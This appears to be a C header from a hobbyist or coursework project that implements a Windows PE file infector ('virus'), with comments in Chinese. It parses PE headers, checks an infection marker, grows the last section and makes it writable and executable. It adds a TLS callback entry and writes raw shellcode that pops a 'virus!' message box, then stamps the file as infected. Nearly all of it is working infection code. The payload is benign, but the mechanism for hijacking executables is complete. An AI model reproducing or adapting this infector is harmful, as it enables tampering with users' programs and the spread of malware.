#pragma once
#include <Windows.h>

int is_injected(FILE* fd) {//判断是否被感染			//没有问题
	long offset = 0x3c;
	char mark[5];
	int nt_offset=0;
	int mark_offset=0;

	fseek(fd, offset, SEEK_SET);
	fread(&nt_offset, 4, 1, fd);
	mark_offset = nt_offset + 8;
	fseek(fd, mark_offset, SEEK_SET);
	fread(mark, 4, 1, fd);
	mark[4] = '\0';
	if (strcmp(mark, "wsxk"))
		return 0;
	
	return 1;
}

long get_nt_header(FILE* fd) {//nt头偏移			//没有问题
	long offset = 0x3c;
	char mark[5];
	int nt_offset=0;
	int mark_offset=0;

	fseek(fd, offset, SEEK_SET);
	fread(&nt_offset, 4, 1, fd);
	
	return nt_offset;
}

long get_section_header(FILE* fd) {//节区头偏移			//没有问题
	long nt_offset=0;
	long section_offset=0;
	long nt_size=0;
	long optional_size=0;
	nt_offset = get_nt_header(fd);
	fseek(fd, 20 + nt_offset, SEEK_SET);
	fread(&optional_size, 2, 1, fd);
	printf("optional_size:%x\n", optional_size);
	nt_size = 24 + optional_size;
	section_offset = nt_size + nt_offset;
	
	return section_offset;
}

long get_optional_header(FILE* fd) {//可选头的文件偏移		//没有问题
	long nt_offset=0;
	long optional_offset=0;

	nt_offset = get_nt_header(fd);
	optional_offset = nt_offset + 24;
	printf("optional_offset:%x\n", optional_offset);
	return optional_offset;
}

void write_tls_data(FILE *fd,long raw_offset,long VA,long size) {//填充tls数据
	long optional_offset = get_optional_header(fd);
	long imagebase_offset = optional_offset + 28;
	long imagebase=0;
	long data=0;
	int i=0;

	fseek(fd, imagebase_offset, SEEK_SET);
	fread(&imagebase, 4, 1, fd);
	printf("imagebase:%x\n", imagebase);
	data = imagebase + VA + size;
	fseek(fd, raw_offset, SEEK_SET);
	fwrite(&data, 4, 1, fd);
	data += 4;
	fwrite(&data, 4, 1, fd);
	data += 4;
	fwrite(&data, 4, 1, fd);
	data += 4;
	fwrite(&data, 4, 1, fd);
	data = 0;
	for (i = 0; i < 5; i++) {
		fwrite(&data, 4, 1, fd);
	}
	data = imagebase + VA + size+6*4+0x40;
	fwrite(&data, 4, 1, fd);
	for (i = 0; i < 2; i++) {
		long d = 0;
		fwrite(&d, 4, 1, fd);
	}

	return;
}

void inject_code(FILE* fd, long raw_offset) {
	char a[16] = "user32.dll\0";
	char b[16] = "MessageBoxA\0";
	char c[16] = "wsxk\0";
	char d[16] = "virus!\0";
	char write[0x1a0] = { 232, 0, 0, 0, 0, 91, 100, 139, 21, 48, 0, 0, 0, 139, 82, 12, 139, 82, 28, 139, 18, 139, 82, 80, 82, 83, 131, 235, 69, 83, 139, 194, 5, 208, 11, 2, 0, 255, 208, 91, 90, 129, 194, 80, 245, 1, 0, 83, 131, 235, 53, 83, 80, 139, 194, 255, 208, 91, 106, 0, 131, 235, 37, 83, 131, 195, 16, 83, 106, 0, 255, 208, 194,0 };
	int i = 0;
	fseek(fd, raw_offset, SEEK_SET);
	fwrite(a, 1, 16, fd);
	fwrite(b, 1, 16, fd);
	fwrite(c, 1, 16, fd);
	fwrite(d, 1, 16, fd);
	for (i = 0; i < 0x1a0; i++) {
		fwrite((write+i), 1, 1, fd);
	}
	return;
}
void set_mark(FILE* fd) {
	char mark[5] = "wsxk";
	long nt_offset = get_nt_header(fd);

	fseek(fd, nt_offset + 8, SEEK_SET);
	fwrite(mark, 4, 1, fd);

	return;
}

void virus(FILE* fd) {
	long nt_offset=0;
	long section_header_offset=0;
	long number_of_section=0;
	long size_of_section=0;
	long offset_of_last_section_header=0;
	if (is_injected(fd))
		return;
	nt_offset = get_nt_header(fd);
	printf("nt_offset:%x\n", nt_offset);
	section_header_offset = get_section_header(fd);
	printf("section_offset:%x\n", section_header_offset);

	//获得节区数量			//没有问题
	fseek(fd, nt_offset + 6, SEEK_SET);
	fread(&number_of_section, 2, 1, fd);
	printf("number of sections:%d\n", number_of_section);

	//获得最后一个节区头的偏移		//没有问题
	offset_of_last_section_header = (section_header_offset + (number_of_section - 1) * 0x28);
	printf("offset_of_last_section_header:%x\n",offset_of_last_section_header);

	//修改末节区大小				//没有问题
	fseek(fd, offset_of_last_section_header + 16, SEEK_SET);
	fread(&size_of_section, 4, 1, fd);
	size_of_section = size_of_section + 0x200;		
	fseek(fd, offset_of_last_section_header + 16, SEEK_SET);
	fwrite(&size_of_section, 4, 1, fd);
	
	//修改末节区属性
	int characteristic = 0xE0000060;//可读可写可执行		//没有问题
	fseek(fd, offset_of_last_section_header + 36, SEEK_SET);
	fwrite(&characteristic, 4, 1, fd);

	//修改可选头（optional header 的内容)
	long optional_offset=0;
	long data_array_offset=0;
	long tls_data_array_offset=0;
	long last_section_VA=0;
	long last_section_pointer_to_rawdata=0;
	size_of_section -= 0x200; //之前修改过大小，这里是当偏移用的.
	optional_offset = get_optional_header(fd);
	data_array_offset = optional_offset + 96;
	tls_data_array_offset = data_array_offset + 9 * 8;//这里得到了TLS的结构体的偏移	//没有问题
	printf("tls_data_array_offset:%x\n", tls_data_array_offset);
	fseek(fd, offset_of_last_section_header+12, SEEK_SET);
	fread(&last_section_VA, 4, 1, fd);
	printf("last_section_VA:%x\n", last_section_VA);//没问题
	fseek(fd, offset_of_last_section_header + 20, SEEK_SET);
	fread(&last_section_pointer_to_rawdata, 4, 1, fd);
	printf("last_section_pointer_to_rawdata:%x\n", last_section_pointer_to_rawdata);//没问题
	long tls_va = last_section_VA + size_of_section;	//写入tls数据的虚拟地址
	fseek(fd, tls_data_array_offset, SEEK_SET);
	fwrite(&tls_va, 4, 1, fd);
	long size = 0x18;	//写入tls数据结构的大小
	fseek(fd, tls_data_array_offset + 4, SEEK_SET);
	fwrite(&size, 4, 1, fd);

	//填入tls的数据
	write_tls_data(fd, last_section_pointer_to_rawdata +size_of_section,tls_va,size);

	//填入注入的代码
	inject_code(fd, last_section_pointer_to_rawdata + size_of_section + 0x30);
	
	//设置已经感染的标记
	set_mark(fd);

	return;
}